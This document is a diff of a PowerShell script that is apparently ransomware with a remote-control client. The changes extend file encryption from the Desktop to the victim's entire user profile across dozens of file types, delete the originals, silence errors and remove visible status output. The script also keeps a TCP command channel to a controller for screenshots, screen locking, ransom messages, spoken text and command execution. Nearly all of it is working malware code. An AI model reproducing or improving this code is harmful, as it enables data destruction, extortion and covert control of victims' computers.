@@ -1,24 +1,19 @@
-﻿
+﻿$ErrorActionPreference = 'SilentlyContinue'
+
 function DisplayMessage()
 {
     function GenFakeWalletAddr()
     {
         $randChars = @('1','2','3','4','5','6','7','8','9','0','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','w','y','z')
-
         $walletString = ''
-
         while($walletString.length -lt 35)
         {
             $randIndex = Get-Random -Min 0 -Max 36
-
             $randChar = $randChars[$randIndex]
-
             $walletString += $randChar
         }
-
         return $walletString
     }
-
     $walletAddr = GenFakeWalletAddr
 
 $Text = @'
@@ -119,6 +114,20 @@ function ScreenShot()
 
 function EncryptFS()
 {
+    $extensions = @('.doc','.docx','.odt',
+                '.xlsx','.pdf','.xls',
+                '.db','.sql','.mdb',
+                '.accdb','.dwg','.html',
+                '.css','.js','.xhtml',
+                '.zip','.gz','.7z',
+                '.bak','.tmp','.txt',
+                '.jpg','.png','.avi',
+                '.mp3','.mp4','.xml',
+                '.pptx','.ppt','.csv',
+                '.dat','.odt','.bat',
+                '.lnk','.url','.ps1',
+                '.exe','.msi','.conf')
+
     $prng   = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
     $cipher = New-Object System.Security.Cryptography.AesCryptoServiceProvider
     $key    = [System.Byte[]]::new(32) 
@@ -131,30 +140,34 @@ function EncryptFS()
     $prng.GetBytes($iv)
     $cipher.Key = $key
     $cipher.IV  = $iv
-    $current_user = $env:USERNAME
-    $base_path  = "C:\Users\$current_user\Desktop"
-    Get-ChildItem -Path $base_path | Foreach-Object {
-                                                        $current_file = $_.FullName
-                                                        if((Get-ChildItem $current_file) -is [System.IO.FileInfo])
-                                                        {
-                                                            try
-                                                            {
-                                                                $new_file_name = $current_file+'.enc'
-                                                                $file_content  = [System.IO.File]::ReadAllBytes($current_file)
-                                                                $cipher_obj    = $cipher.CreateEncryptor()
-                                                                $enc_bytes     = $cipher_obj.TransformFinalBlock($file_content, 0, $file_content.Length)
-                                                                [byte[]]$enc_bytes_iv   = $cipher.IV+$enc_bytes
-                                                                $ciphertext    = [System.Convert]::ToBase64String($enc_bytes_iv)
-                                                                $current_path  = (Get-Location).Path 
-                                                                Set-Content -Path $new_file_name -Value $ciphertext 
-                                                                Remove-Item $current_file
-                                                            }
-                                                            catch
-                                                            {
-                                                                continue
-                                                            }
-                                                        }
-                                                    }
+    Get-ChildItem -Path C:\Users\$env:USERNAME -Recurse -File -ErrorAction 'SilentlyContinue' | Foreach-Object {
+                                                                        
+                                                                            $current_file = $_.FullName
+
+                                                                            $current_ext  = '.'+$_.Name.Split('.')[1]
+
+                                                                            if((Get-ChildItem $_.FullName) -is [System.IO.FileInfo])
+                                                                            {
+                                                                                if(($current_file -ne $MyInvocation.MyCommand.Source) -and ($current_file -ne $key_path) -and ($current_ext -in $extensions))
+                                                                                {
+                                                                                    try
+                                                                                    {
+                                                                                        $new_file_name = $current_file+'.enc'
+                                                                                        $file_content  = [System.IO.File]::ReadAllBytes($current_file)
+                                                                                        $cipher_obj    = $cipher.CreateEncryptor()
+                                                                                        $enc_bytes     = $cipher_obj.TransformFinalBlock($file_content, 0, $file_content.Length)
+                                                                                        [byte[]]$enc_bytes_iv   = $cipher.IV+$enc_bytes
+                                                                                        $ciphertext    = [System.Convert]::ToBase64String($enc_bytes_iv)
+                                                                                        Set-Content -Path $new_file_name -Value $ciphertext 
+                                                                                        Remove-Item $_.FullName
+                                                                                    }
+                                                                                    catch
+                                                                                    {
+                                                                                        continue
+                                                                                    }
+                                                                                }
+                                                                            }
+                                                                        }
     $cipher.Dispose()
     $prng.Dispose()
     return $key_path
@@ -169,45 +182,44 @@ function DecryptFS()
     $key        = Get-Content "aes.key"
     $cipher     = New-Object System.Security.Cryptography.AesCryptoServiceProvider
     $cipher.Key = $key
-    $current_user = $env:USERNAME
-    $base_path  = "C:\Users\$current_user\Desktop"
-    Get-ChildItem -Path $base_path | Foreach-Object {
-                                                            $current_file = $_.FullName 
-                                                            
-                                                            if(($current_file | Select-String '.enc') -and ($current_file -ne 'aes.key'))
-                                                            {
-                                                                try
-                                                                {
-                                                                    $current_path        = (Get-ChildItem $current_file).FullName ; WRite-Host $current_path    
-                                                                    $current_file_name   = (Get-ChildItem $current_file).Name     ; Write-Host $current_file_name
-                                                                    $path_segments       = $current_path.Split('\')
-                                                                    $write_path          = ''
-                                                                    $value               = $path_segments[0] 
-                                                                    $iter                = 0
-                                                                    while($value -ne $current_file_name)
-                                                                    {
-                                                                        $write_path += $value
-                                                                        $write_path += '\'
-                                                                        $iter       += 1
-                                                                        $value       = $path_segments[$iter]
+    Get-ChildItem -Path C:\Users\$env:USERNAME -Recurse -File -ErrorAction 'SilentlyContinue' | Foreach-Object {
+
+                                                                        $current_file = $_.FullName 
+
+                                                                        if(($current_file | Select-String '.enc') -and ($current_file -ne 'aes.key'))
+                                                                        {
+                                                                            try
+                                                                            {
+                                                                                $current_path        = (Get-ChildItem $current_file).FullName     
+                                                                                $current_file_name   = (Get-ChildItem $current_file).Name     
+                                                                                $path_segments       = $current_path.Split('\')
+                                                                                $write_path          = ''
+                                                                                $value               = $path_segments[0] 
+                                                                                $iter                = 0
+                                                                                while($value -ne $current_file_name)
+                                                                                {
+                                                                                    $write_path += $value
+                                                                                    $write_path += '\'
+                                                                                    $iter       += 1
+                                                                                    $value       = $path_segments[$iter]
+                                                                                }
+                                                                                $segments            = $current_file_name.Split('.')
+                                                                                $decrypted_file_name = $segments[0]+"."+$segments[1]
+                                                                                $ct_file_content = Get-Content $current_file
+                                                                                $ct_file_content = [System.Convert]::FromBase64String($ct_file_content)
+                                                                                $cipher.IV       = $ct_file_content[0..15]
+                                                                                $decipher_obj    = $cipher.CreateDecryptor()
+                                                                                $plaintext  = $decipher_obj.TransformFinalBlock($ct_file_content, 16, $ct_file_content.Length-16)
+                                                                                $decrypted_file_path = $write_path+'\'+$decrypted_file_name
+                                                                                Set-Content -Path $decrypted_file_path -Value $plaintext -Encoding Byte
+                                                                                Remove-Item $current_file
+                                                                            }
+                                                                            catch
+                                                                            {
+                                                                                continue
+                                                                            }
+                                                                        }
                                                                     }
-                                                                    $segments            = $current_file_name.Split('.')
-                                                                    $decrypted_file_name = $segments[0]+"."+$segments[1]
-                                                                    $ct_file_content = Get-Content $current_file
-                                                                    $ct_file_content = [System.Convert]::FromBase64String($ct_file_content)
-                                                                    $cipher.IV       = $ct_file_content[0..15]
-                                                                    $decipher_obj    = $cipher.CreateDecryptor()
-                                                                    $plaintext  = $decipher_obj.TransformFinalBlock($ct_file_content, 16, $ct_file_content.Length-16)
-                                                                    $decrypted_file_path = $write_path+'\'+$decrypted_file_name
-                                                                    Set-Content -Path $decrypted_file_path -Value $plaintext -Encoding Byte
-                                                                    Remove-Item $current_file
-                                                                }
-                                                                catch
-                                                                {
-                                                                    continue
-                                                                }
-                                                            }
-                                                    }
     $cipher.Dispose()
 }
 
@@ -216,11 +228,6 @@ function PSClient($addr,$port)
     try
     {
         $s = New-Object Net.Sockets.TcpClient($addr,$port)
-
-        if($s)
-        {
-            Write-Host "[*] Connected"
-        }
     }
     catch
     {
@@ -283,7 +290,7 @@ function PSClient($addr,$port)
                     Set-Content -Path ".\$filename" -Value $content -Encoding Byte
                     DecryptFS
                     Remove-Item $filename
-                    Get-Process | Where-Object { ($_.ProcessName -eq 'powershell') -and ($_.Id -ne $PID)} | Stop-Process
+                    Get-Process | Where-Object { ($_.ProcessName -eq 'powershell') -and ($_.Id -ne $PID)} | Stop-Process -ErrorAction SilentlyContinue
                     continue
                 }
                 if($intake | Select-String 'screenshot')
@@ -304,23 +311,45 @@ function PSClient($addr,$port)
                     {
                         $response = '[!] Failed to locate screenshot '
                         $response = [System.Text.Encoding]::Unicode.GetBytes($response)
-                        $response = [Convert]::ToBase64String($result)
+                        $response = [Convert]::ToBase64String($response)
                         $transmitter.WriteLine($response)
                         $transmitter.Flush()
                         continue
                     }
 
                 }
-                if($intake | Select-String 'persist')
+                if($intake | Select-String 'speak')
                 {
+                    $segments     = $intake.Split('#')[1]
+                    $segments     = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($segments))
+                    $segments     = $segments.Split('#')
+                    $transmission = ''
+
+                    for($i = 0; $i -lt $segments.Length; $i++)
+                    {
+                        $transmission += $segments[$i]
+                        $transmission += ' '
+                    }
+
+                    Add-Type -AssemblyName System.Speech
+                    $speakObject = New-Object System.Speech.Synthesis.SpeechSynthesizer
+                    $speakObject.SelectVoice('Microsoft Zira Desktop')
+                    $speakObject.Volume = 100
+                    $speakObject.Rate   = -3
+                    $speakObject.Speak($transmission)
                     continue
                 }
                 if($intake | Select-String 'lockscreen')
                 {
-                    Write-Host "Locking screen..."
                     try
                     {
                         rundll32.exe user32.dll,LockWorkStation
+                        $response = '[*] Locked the screen of the remote host'
+                        $response = [System.Text.Encoding]::Unicode.GetBytes($response)
+                        $response = [Convert]::ToBase64String($response)
+                        $transmitter.WriteLine($response)
+                        $transmitter.Flush()
+                        continue
                     }
                     catch 
                     {
@@ -335,6 +364,12 @@ function PSClient($addr,$port)
                          (Get-Command -Type Function DisplayMessage).Definition
                        )
                     ))
+                    $response = '[*] Displayed message on the remote host'
+                    $response = [System.Text.Encoding]::Unicode.GetBytes($response)
+                    $response = [Convert]::ToBase64String($response)
+                    $transmitter.WriteLine($response)
+                    $transmitter.Flush()
+                    continue
                 }
                 if($intake | Select-String 'menu')
                 {
@@ -346,7 +381,6 @@ function PSClient($addr,$port)
                     {
                         $decoded_intake      = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($intake))
                         $cmd                 = $decoded_intake
-                        Write-Host $cmd
                         if($cmd | Select-String 'exit')
                         {
                             try
@@ -373,4 +407,4 @@ function PSClient($addr,$port)
     }
 }
 
-PSClient 192.168.255.9 8080
+PSClient localhost 8080
